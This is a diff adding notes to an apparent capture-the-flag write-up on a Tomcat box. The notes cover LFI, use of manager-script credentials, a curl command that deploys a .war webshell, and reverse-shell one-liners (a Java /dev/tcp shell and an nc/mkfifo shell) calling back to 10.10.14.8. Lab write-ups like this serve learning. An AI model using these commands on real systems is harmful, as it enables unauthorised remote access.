@@ -115,12 +115,32 @@ tomcat:s3cr3t
 admin:tomcat
 ```
 
-<br/><br/>
-
+<br/><br/> 
 
 ## <span style="color:#FF5050">Random Notes👀  
 * PHP is being used in the backend.  
 * So LFI gives me access to files, let's call it, outside of the sandboxed environment but it does not allow me to read files I don't have privilege to read. So what am I supposed to do with it?
+* I will use the manual exploit to try and understand it as much as I can (The upload war thing).
+* It seems that I can't upload a .war file unless I have the right privileges which can be acquired if I have the roles admin, manager or manager-script and according to the `tomcat-users.xml` file I have the `manager-script` role.  
+* The path was right infront of me in the HackTricks page in the RCE section. What lesson did I learn? Read articles properly and don't skip stuff.
+* I will be creating a .war webshell and then I will upload it with this line of code  
+  ```
+  curl --upload-file webshell.war -u 'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/webshell"
+  ```  
+* After creating the war file and uploading it using the previous curl code I can just visit the path `/webshell` with `?cmd=[COMMAND]` which will lead to executing the webshell.  
+* Imma try and upload a reverse shell from the beginning and not a webshell  
+```java
+Runtime r = Runtime.getRuntime();
+Process p = r.exec("/bin/bash -c 'exec 5<>/dev/tcp/10.10.14.8/1234;cat <&5 | while read line; do $line 2>&5 >&5; done'");
+p.waitFor();
+```
+
+```
+rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.8 4444 >/tmp/f
+```
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
 
 <br/><br/>
 
@@ -133,5 +153,3 @@ admin:tomcat
 
 
 <br/><br/> 
-  
-
